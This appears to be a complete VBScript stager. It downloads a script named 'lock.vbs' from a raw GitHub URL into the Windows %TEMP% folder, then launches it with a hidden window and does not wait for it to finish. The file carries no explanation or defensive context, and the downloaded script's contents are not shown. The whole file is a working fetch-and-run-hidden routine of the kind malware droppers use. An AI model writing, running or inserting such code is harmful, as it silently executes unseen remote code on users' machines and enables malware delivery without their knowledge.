' Download the lock script from GitHub
Dim objXML, objStream, url, tempFile

url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/lock.vbs"
tempFile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\lock.vbs"

' Download the file
Set objXML = CreateObject("MSXML2.XMLHTTP")
objXML.Open "GET", url, False
objXML.Send

If objXML.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' adTypeBinary
    objStream.Write objXML.ResponseBody
    objStream.SaveToFile tempFile, 2 ' adSaveCreateOverWrite
    objStream.Close
    Set objStream = Nothing
End If

Set objXML = Nothing

' Run the downloaded script
CreateObject("WScript.Shell").Run """" & tempFile & """", 0, False
